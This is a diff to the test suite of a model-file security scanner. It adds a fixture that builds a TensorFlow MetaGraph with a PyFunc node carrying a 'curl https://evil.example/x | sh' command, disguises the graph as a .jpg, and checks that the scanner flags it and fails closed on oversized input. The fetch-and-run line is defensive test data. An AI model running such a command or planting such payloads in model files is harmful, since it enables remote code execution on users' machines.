@@ -4,12 +4,13 @@ from __future__ import annotations
 
 import base64
 import gzip
+import importlib
 import json
 import pickle
 import zipfile
 from collections.abc import Iterator
 from pathlib import Path
-from typing import Any
+from typing import Any, cast
 
 import pytest
 
@@ -19,6 +20,7 @@ from modelaudit.cache.optimized_config import normalize_material_scan_config
 from modelaudit.core import scan_file, scan_model_directory_or_file
 from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
 from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
+from modelaudit.scanners.tf_metagraph_scanner import _MAX_PARSE_BYTES
 from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
 from tests.helpers import create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip
 
@@ -37,6 +39,19 @@ def _build_malicious_pickle() -> bytes:
             return (os_module.system, ("echo core-dispatch-test",))
 
     return pickle.dumps(DangerousPayload())
+
+
+def _build_malicious_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "modelaudit_route_test"
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
 
 
 def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
@@ -1785,6 +1800,51 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
         issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
         for issue in result.issues
     )
+
+
+def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "malicious.jpg"
+    disguised_metagraph.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.message == "Dangerous TensorFlow operation: PyFunc"
+        and issue.details.get("op_type") == "PyFunc"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "oversized.jpg"
+    seed = _build_malicious_tf_metagraph()
+    disguised_metagraph.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        result = scan_file(str(disguised_metagraph), config=config)
+        repeated_result = scan_file(str(disguised_metagraph), config=config)
+
+        assert result.scanner_name == "tf_metagraph"
+        assert result.success is False
+        assert repeated_result.success is False
+        assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
+        assert any("MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 2
 
 
 def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
